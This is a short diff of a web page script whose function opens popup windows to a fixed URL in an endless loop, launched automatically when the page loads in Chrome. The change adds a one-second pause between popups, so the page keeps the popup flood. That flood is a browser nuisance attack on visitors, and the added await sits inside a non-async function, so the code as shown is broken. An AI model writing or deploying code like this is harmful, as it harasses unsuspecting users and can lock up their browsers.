@@ -9,6 +9,7 @@ function openMultiplePopupsInfinite() {
   const url = 'https://uexedus.github.io/'; // Replace with the desired URL
   while (true) {
     window.open(url, 'popUpWindow', 'height=300,width=400,left=100,top=100');
+    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for a second before opening the next one
   }
 }
 
@@ -17,6 +18,7 @@ if (navigator.userAgent.indexOf("Chrome") != -1) {
     openMultiplePopupsInfinite();
   }, 100);
 }
+
 
   </script>
 </head>
